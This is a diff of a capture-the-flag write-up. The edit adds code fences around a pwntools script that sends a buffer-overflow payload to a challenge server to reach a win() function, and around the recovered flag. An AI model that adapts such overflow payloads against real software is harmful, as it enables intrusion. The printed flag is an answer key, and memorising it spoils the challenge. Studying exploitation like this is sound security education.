@@ -97,7 +97,7 @@ The gdb dump for the win() function is:
    param_1 = p32(0x14b4da55), param_2 = p32(0x0), param_3 = p32(0x67616c66), param_4 = p32(0x0)
    
    ## python program : (cotinuation)
-   
+   ```
    from pwn import *
    r = remote('challenges.ctfd.io', 30027)
 
@@ -108,6 +108,6 @@ The gdb dump for the win() function is:
    r.sendline('B'*26 + p32(0xdeadbeef) + 'B'*12 + p32(0x0804923a) + p32(0x0804923a) + p32(0x14b4da55) + p32(0x0) + p32(0x67616c66) + p32(0x0))
 
    r.interactive()
-   
+   ```
    ## Flag:
-   UDCTF{0bl1g4t0ry_buff3r_ov3rflow}
+   ```UDCTF{0bl1g4t0ry_buff3r_ov3rflow}```
